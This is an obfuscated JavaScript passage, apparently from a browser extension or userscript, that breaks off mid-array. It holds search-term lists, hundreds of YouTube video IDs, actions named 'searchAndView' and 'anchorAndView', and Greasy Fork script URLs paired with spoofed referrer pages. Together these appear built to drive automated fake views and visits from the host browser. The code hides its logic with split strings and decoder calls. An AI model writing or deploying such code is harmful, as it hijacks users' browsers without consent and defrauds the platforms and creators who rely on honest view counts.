searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x158e + -0x81b + -0xd69)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x185c * -0x1 + 0x146b * -0x1 + 0x2cd1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x94 * 0xa + -0x1b4d + 0x1588);

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x123 * 0x7 + -0x170d + 0x1f02);
    let h = e[f];
    return h;
  }, d(b, c);
}
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    a3(0x28) + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    a3(0xa) + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    a3(0xe) + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    a2(0x21) + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    a3(0x16) + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + a4(0x1d, 'n8FB') + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': a3(0x2) + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a2(0x25) + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a4(0x24, 'j(Xq') + 'com?page=9'
    },
    {
      'url': 'https://gr' + a2(0x1f) + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a3(0x3) + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
